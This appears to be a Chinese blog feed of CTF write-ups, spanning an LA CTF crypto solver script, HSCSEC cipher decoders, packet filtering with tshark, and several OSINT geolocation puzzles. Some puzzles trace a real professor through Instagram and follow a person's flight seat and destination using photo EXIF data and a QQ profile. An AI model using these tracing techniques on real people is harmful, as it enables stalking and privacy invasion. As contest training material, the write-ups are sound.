class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q*<span class="hljs-number">2</span>*<span class="hljs-number">3</span>*<span class="hljs-number">5</span><br><br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br><br>oracle_uses = <span class="hljs-number">0</span><br><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This time I&#x27;ll answer 2 modulus questions and give you 30 guesses.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> oracle_uses == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">elif</span> modulus &gt; <span class="hljs-built_in">max</span>(p, q):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something smaller pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                oracle_uses += <span class="hljs-number">1</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>            guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-built_in">print</span>(f.readline())<br>                    exit()<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br></code></pre></td></tr></table></figure><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>a, b = crt([p,q],[x,y])<br>r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br><span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/21.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CATS"><a href="#CATS" class="headerlink" title="CATS!"></a>CATS!</h3><h4 id="题目说明-14"><a href="#题目说明-14" class="headerlink" title="题目说明"></a>题目说明</h4><p>CATS OMG I CAN’T BELIEVE HOW MANY CATS ARE IN THIS IMAGE I NEED TO VISIT CAN YOU FIGURE OUT THE NAME OF THIS CAT HEAVEN?<br>Answer is the domain of the website for this location. For example, if the answer was ucla, the flag would be lactf{ucla.edu}.</p><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的社工题<br><img src="/mdimg/lactf/22.png"><br><img src="/mdimg/lactf/23.png"><br><a href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>文章里面有他们的官网 如下图所示<br><img src="/mdimg/lactf/24.png"></p><h3 id="hike-to-where"><a href="#hike-to-where" class="headerlink" title="hike to where?"></a>hike to where?</h3><h4 id="题目说明-15"><a href="#题目说明-15" class="headerlink" title="题目说明"></a>题目说明</h4><p>Where was this photo taken? I think it used to be in the original photo, but someone cropped it out!<br>The flag is <code>lactf&#123;location&#125;</code>, where location is the name of the POI that this person hiked up to, all lowercase and replacing spaces with underscrolls. Use the google maps name of the POI: for example, if the solution is the UCLA Bruin Bear statue, <a href="https://www.google.com/maps/place/Bruin+Statue,+Los+Angeles,+CA+90095/@34.0709817,-118.4451726,21z/data=!4m6!3m5!1s0x80c2bc88d12933e3:0xa3b319ea03ca4057!8m2!3d34.0709621!4d-118.4449902!16s%2Fg%2F12hl7g0mm">this</a> is the google maps location, and the flag would be <code>lactf&#123;bruin_statue&#125;</code>.<br>Please note: contacting anyone or any organization beyond official LA CTF support channels regarding this challenge is against the rules. Please be respectful of those who are involved in this challenge.<br><img src="/mdimg/lactf/25.png"></p><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>从他的衣服上面的字可以知道他是ucla的计算机学院的老师<br>尝试在ucla的官网找这个老师，但是没找到<br><img src="/mdimg/lactf/26.png"><br>em…….识别出来的这个是生物老师<br>题目是远足，那就google一下<br><img src="/mdimg/lactf/27.png"><br>在Instagram里面找到这个人<a href="https://www.instagram.com/peaksandprofessors.ucla/">https://www.instagram.com/peaksandprofessors.ucla/</a><br><img src="/mdimg/lactf/28.png"><br><img src="/mdimg/lactf/29.png"><br><code>lactf&#123;skull_rock&#125;</code></p><h3 id="hidden-in-plain-sheets"><a href="#hidden-in-plain-sheets" class="headerlink" title="hidden in plain sheets"></a>hidden in plain sheets</h3><h4 id="题目说明-16"><a href="#题目说明-16" class="headerlink" title="题目说明"></a>题目说明</h4><p>I found this google sheets link on the internet. I’m sure it’s hiding something, but I can’t find anything? Can you find the flag?<br>Choose any link (they’re all the same):  <a href="https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit">Link 1</a> <a href="https://docs.google.com/spreadsheets/d/17A1f0z8rmR7356fcHmHTHt3Y0JMgcHlGoflADtNXeOU/edit">Link 2</a> <a href="https://docs.google.com/spreadsheets/d/1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw/edit">Link 3</a></p><h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>flag在另一个Sheet但我们没有查看权限<img src="/mdimg/lactf/30.png"><br>经过查资料发现Google表格的<code>IMPORTRANGE</code>函数可以做到倒入内容这一点。<br><img src="/mdimg/lactf/31.png"><br>所以直接get flag<br><img src="/mdimg/lactf/32.png"></p><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><h4 id="题目说明-17"><a href="#题目说明-17" class="headerlink" title="题目说明"></a>题目说明</h4><p>I was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag?</p><h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>UDP流量分析，采用了RFC 3514 <a href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/lactf/33.png"><br>:::tips<br>Flags是flag Segment的缩写，是标志字段。<br>它其实是IP报文头中的一个字段，因为TCP、UDP协议，应用层协议大部分都是封装在IP包中的，所以分析这些协议时，就会经常看到这个字段。<br>标识字段有3位。<br>Reserved bit：1位,是保留位，一般用不上；<br>Don’t fragment ：1位，用来表示数据包是否分片（Not set表示数据包没有分片）；<br>More fragment：1位，用来表示是否是最后一个片段（Not set表示是最后一个）。<br>:::<br>查看flags字段和Data段，data段有1字节数据。<br><img src="/mdimg/lactf/34.png"><br>往下看，在N0.5，<br><img src="/mdimg/lactf/35.png"><br>查看RFC 3514官方文档，如果IP<code> Reserved bit</code> 设置为 <code>1 (0x1)</code>，则它是一个恶意数据包。<br><img src="/mdimg/lactf/36.png"><br>所以我们只需要将<code>Reserved bit</code>为0的包过滤出来，将data和Reserved bit设置为列，并将Reserved bit为0设置为过滤条件，也就是<code>ip.flags.rb == 0</code>，观察前几个发现就是lactf的hex值。<br><img src="/mdimg/lactf/37.png"><br>导出过滤后的udp流<br>选择导出特定分组<br><img src="/mdimg/lactf/38.png"><br>打开保存的udp流量包<br>追踪udp流<br><img src="/mdimg/lactf/39.png"><br><code>lactf&#123;3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c&#125;</code><br>tshark：<br><code>**tshark -r EBE.pcap -Y &quot;ip.flags.rb == 0x0&quot; -T fields -e data | xxd -r -p**</code><br><img src="/mdimg/lactf/40.png"></p><h3 id="discord-l34k"><a href="#discord-l34k" class="headerlink" title="discord l34k"></a>discord l34k</h3><h4 id="题目说明-18"><a href="#题目说明-18" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend sent me <a href="https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186">this</a> message link that apparently links to a “flag”, but discord says “You don’t have access to this link”! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?<br>Note: Discord phone verification is NOT required for this challenge.</p><h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目给了一个discord链接<br><code>[https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186](https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186)</code><br><a href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a> 在这篇文章中找到关键图片<br><img src="/mdimg/lactf/41.png"><br>图片下面看到用于 JSON API的URL。在给定的 URL 中，第一个 ID ( 1060030874722259057) 指的是服务器，因此我们将其放在图像中示例 ID 的位置。这给了我们链接<br><code>[https://discordapp.com/api/servers/1060030874722259057/widget.json](https://discordapp.com/api/servers/1060030874722259057/widget.json)</code><br><img src="/mdimg/lactf/42.png"><br>打开之后发现是个邀请链接，打开之后进入LA CTF-Chall Server 5服务器，就可以看到flag了<br><img src="/mdimg/lactf/43.png"><br><img src="/mdimg/lactf/44.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>社工</title>
    <link href="/2023/02/13/%E6%B6%A9%E6%B6%A9/"/>
    <url>/2023/02/13/%E6%B6%A9%E6%B6%A9/</url>
    
    <content type="html"><![CDATA[<p><strong>本题附件传送门：<a href="https://github.com/J-0k3r/something">https://github.com/J-0k3r/something</a></strong></p><p>如果喜欢，点个star捏（逃</p><h2 id="杰哥，我还要涩（整活出的一道涩工）-逃"><a href="#杰哥，我还要涩（整活出的一道涩工）-逃" class="headerlink" title="杰哥，我还要涩（整活出的一道涩工）(逃"></a>杰哥，我还要涩（整活出的一道涩工）(逃</h2><p>这题设置了两条路，两条路都可以解出来<br>readme.txt:</p><ul><li>flag{飞机型号(简称)-座位-目的地(不是机场)}</li><li>良学良是一个带黑阔，他经常要到处跑恰大钱。</li><li>有一个地方他每年都要去的。</li><li>p2是第3次他出去恰钱拍的，p1是他第2次出去拍的（他有个怪癖，每次出去都要坐同一型号的灰鸡）</li><li>最近他又要出去第4次恰了，他买了最近的票准备又去一次，</li><li>他说他上一次去坐的内个位置很舒服，这次再预定一次，</li><li>为了抓住他撅爆他，你能帮我找到他的座位吗？</li><li>噢，还有，前两次他出去时给我发的一些照片，以及一些聊天记录</li><li>你能帮我找到他到底去哪了吗？<h4 id="解1："><a href="#解1：" class="headerlink" title="解1："></a>解1：</h4>要知道飞机座位，需要知道：飞机型号以及航空公司<br>p1：<br><img src="/mdimg/%E6%B6%A9/1.png"><br><a href="https://www.gaitubao.com/exif">https://www.gaitubao.com/exif</a><br><img src="/mdimg/%E6%B6%A9/2.png"><br><img src="/mdimg/%E6%B6%A9/3.png"><br>说明这是在起飞地附近<br>查看exif可以知道是在广州市花都区拍的，根据readme里的说明可以找到起飞的机场是<code>广州白云机场</code><br>p2：<br><img src="/mdimg/%E6%B6%A9/4.png"><br>由p2可以知道这是<code>南方航空</code>的飞机，readme里面说了要坐同一型号的飞机，并且知道了这是在机翼旁边且为机翼前部的靠窗的座位（我去的时候是坐左边，但由于拍照存在视觉误差，所以左边和右边都对）<br>p3：<br><img src="/mdimg/%E6%B6%A9/5.png"><br>根据图可以知道，这里面有落地机场的信息，炒饭很容易想到是扬州炒饭，想不到也没关系<br><img src="/mdimg/%E6%B6%A9/6.png"><br>查看这个图片的exif可以知道诗句的下一句是说<code>扬州</code>（作者的这里的是QQ号，根据放在作者这个位置以及附件都是QQ聊天记录截图，可以猜到是QQ号，这是第2条解题途径，放在同一张图片就是为了用QQ这条路去验证你前面这条路的，QQ这条路比较清晰）<br><img src="/mdimg/%E6%B6%A9/7.png"><br>由以上分析可以知道：<code>南方航空公司，广州白云机场飞往扬州泰州机场</code><br>结合readme里说的买最近的机票(即2月11日)<br><img src="/mdimg/%E6%B6%A9/8.png"><br>得到了飞机型号是<code>空客A320</code>：<a href="https://www.csair.com/cn/tourguide/flight_service/cabin_layout/kongke/18h1tllaukv3c.shtml">https://www.csair.com/cn/tourguide/flight_service/cabin_layout/kongke/18h1tllaukv3c.shtml</a><br><img src="/mdimg/%E6%B6%A9/9.png"><br>根据p2拍摄的位置，可以知道为<code>36A 或者36K</code><br>至此，flag的前半段出来了：<code>flag&#123;空客A320-36A</code><br>p4：<br><img src="/mdimg/%E6%B6%A9/10.png"><br>这两张图片搜图应该可以知道是第一张是上海的外滩，第二张是在东方明珠的脚下<br>搜不到也没关系<br><img src="/mdimg/%E6%B6%A9/11.png"><br>p5里面很清楚的说到，最高，632  百度就知道<br><img src="/mdimg/%E6%B6%A9/12.png"><br>（这里也有后面要用到的信息：<code>陆家嘴</code>，(其实这(陆家嘴金融贸易区)也是一个坑<img src="/mdimg/%E6%B6%A9/a.png">，误导后面的flag)</li></ul><p>但是没发现也问题不大，看下面<br>p6：<br><img src="/mdimg/%E6%B6%A9/13.png"><br>这里就很精彩的给出了一张在外滩拍摄的<code>陆家嘴CBD</code>的图片，里面包含的东方明珠，以及上海中心大厦是前面的图片里的<br>到这很清晰的知道是上海，而且flag的格式说的很清楚：<code>地方+属性 例子：**曼哈顿***</code><br>百度曼哈顿可以知道它是纽约的CBD（有学过地理的可以一眼丁真，没学过也没关系有百度）<br>根据hint可以知道 例子：纽约曼哈顿CBD （这里我已经故意找了一个字数和flag一样的例子了，比如广州天河CBD就相差了一个字）<br>那就可以知道就是<code>上海的CBD</code>了，百度可以知道是<code>陆家嘴</code><br>（这里的逻辑其实很清楚，聊天记录里说：这其实都是一个地方&amp;他们由共同的特点……..附件里面的关于上海的照片都在一个很小的范围内，几个地方相隔不到200米，他们都隶属语陆家嘴CBD。如果单纯是上海，上海辣么大，为什么不放其他地方的照片捏。还有就是曼哈顿了，一个在美国，一个在中国，他们怎么扯上关系，怎么有相同的特点呢？曼哈顿的属性就是纽约的CBD呐)<br>综上所述：后半段<code>上海陆家嘴CBD</code><br><code>flag&#123;空客A320-36A-上海陆家嘴CBD&#125;</code>&amp; <code>flag&#123;空客A320-36K-上海陆家嘴CBD&#125;</code></p><h4 id="解2："><a href="#解2：" class="headerlink" title="解2："></a>解2：</h4><p>前面都一样的操作，从P3开始<br>由QQ号可以<br><img src="/mdimg/%E6%B6%A9/14.png"><br><code>这个头像就是前面聊天记录的解题的要找的那个人啊！涩一个人最好肯定就是翻他的QQ空间和朋友圈啦</code><br><img src="/mdimg/%E6%B6%A9/15.png"><br>得到了目的地机场：<code>扬州泰州机场</code><br>然后的操作和解1一样<br>继续翻<br><img src="/mdimg/%E6%B6%A9/16.png"><br>百度<code>600663</code><br><img src="/mdimg/%E6%B6%A9/17.png"><br><code>陆家嘴</code><br>继续翻<br><img src="/mdimg/%E6%B6%A9/18.png"><br><img src="/mdimg/%E6%B6%A9/19.png"><br><code>CBD</code><br>这样就肥肠清晰了捏<br><code>flag&#123;空客A320-36A-上海陆家嘴CBD&#125;</code>&amp; <code>flag&#123;空客A320-36K-上海陆家嘴CBD&#125;</code><br>两条路任意一条都可以<br>当然可以都走一走，相互验证就更加清晰明了了，第一条路比较需要逻辑能力，第二条就百度就完事了（逃</p><p><img src="/mdimg/%E6%B6%A9/20.gif"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HSCSEC 2023-wp</title>
    <link href="/2023/02/13/HSCSEC%202023-wp/"/>
    <url>/2023/02/13/HSCSEC%202023-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="本次比赛所有附件，关注微信公众号：Hor1zon-回复HSCSEC-获取"><a href="#本次比赛所有附件，关注微信公众号：Hor1zon-回复HSCSEC-获取" class="headerlink" title="本次比赛所有附件，关注微信公众号：Hor1zon 回复HSCSEC 获取"></a><strong>本次比赛所有附件，关注微信公众号：Hor1zon 回复HSCSEC 获取</strong></h1><h1 id="Ancient-MISC"><a href="#Ancient-MISC" class="headerlink" title="Ancient-MISC"></a>Ancient-MISC</h1><h3 id="Watch-the-sky-at-night"><a href="#Watch-the-sky-at-night" class="headerlink" title="Watch the sky at night"></a>Watch the sky at night</h3><p>24星宿<br><code>斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴 虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐 壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马 虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓 室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐 牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌 危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐 斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡 危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴 牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎 室火猪鬼金羊柳土獐壁水貐</code><br><img src="/mdimg/hscsec/1.png"><br>东北西南依次对应0123，4进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-string">&quot;&quot;</span><br>text =<span class="hljs-string">&quot;1020,1103,1003,1103,1011,1003,1323,1003,1032,1133,1001,1232,1203,1221,1211,1232,1310,1133,1001,1100,1331&quot;</span><br><br>c=text.split(<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>        temp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(i)):<br>            temp += <span class="hljs-built_in">int</span>(i[j]) * (<span class="hljs-number">4</span> ** (<span class="hljs-built_in">len</span>(i) - j -<span class="hljs-number">1</span>))<br>        m += <span class="hljs-built_in">chr</span>(temp)<br><span class="hljs-built_in">print</span> (m)<br><span class="hljs-comment">#HSCSEC&#123;CN_Ancient_AP&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Deduced-gossip"><a href="#Deduced-gossip" class="headerlink" title="Deduced gossip"></a>Deduced gossip</h3><p>盗墓笔记看多了，了解一点，一眼八卦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲<br></code></pre></td></tr></table></figure><p>八卦有八个卦象，还有一个空字，猜测9进制<br>猜格式是HSCSEC{}<br>前7个对应9进制<code>80,102,74,102,76,74,146</code>，最后一个是<code>148</code><br>则还剩下3，5没有对应，尝试两次就行<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">dict1 = &#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>dict2=&#123;<span class="hljs-string">&#x27;☵&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;☷&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;☳&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;☰&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;空&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br>        <span class="hljs-string">&#x27;☴&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;☱&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;☶&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;☲&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>&#125;<br>c= <span class="hljs-string">&#x27;☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲&#x27;</span><br>flag1=<span class="hljs-string">&#x27;&#x27;</span><br>flag2= <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#表1</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag1 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag1 +=  dict1.get(x)<br><span class="hljs-comment">#表2</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> x==<span class="hljs-string">&#x27; &#x27;</span>:<br>        flag2 +=<span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">continue</span><br>    flag2+=  dict2.get(x)<br><span class="hljs-built_in">print</span>(flag1)<br><span class="hljs-built_in">print</span>(flag2)<br><span class="hljs-comment">#80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148</span><br><span class="hljs-comment">#80 102 74 102 76 74 146 74 123 126 152 122 157 122 113 124 35 157 157 154 148</span><br></code></pre></td></tr></table></figure><p>然后在线转换器转一下发现表1是对的<br><code>HSCSEC&#123;Chinese_g0ssip&#125;</code></p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;广东省广州市天河区天河市天河路天河步行街&#125;</code><br><img src="/mdimg/hscsec/2.png"><br>图片信息：<code>阿勒泰市第13届元宵灯会</code><br><img src="/mdimg/hscsec/3.png"><br><img src="/mdimg/hscsec/4.png"><br><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>说明：<code>flag形式为：HSCSEC&#123;&#125; 例如：HSCSEC&#123;具体地址&#125;</code><br><img src="/mdimg/hscsec/5.png"><br>百度识图第一张就是<br><img src="/mdimg/hscsec/6.png"><br>地图搜西湖<br><img src="/mdimg/hscsec/7.png"><br><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p><img src="/mdimg/hscsec/8.png"><br>一眼重庆<br><img src="/mdimg/hscsec/9.png"><br><img src="/mdimg/hscsec/10.png"><br>根据图片基本可以判断一个区域<br><img src="/mdimg/hscsec/11.png"><br>看图片是一个靠近江边的地方<br>搜山什集找到类似的图片<br><img src="/mdimg/hscsec/12.png"><br><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p><img src="/mdimg/hscsec/13.png"><br><img src="/mdimg/hscsec/14.png"><br>甘肃消防<br><img src="/mdimg/hscsec/15.png"><br>图上建筑吻合<br><a href="https://cul.sohu.com/a/635448600_120801">https://cul.sohu.com/a/635448600_120801</a><img 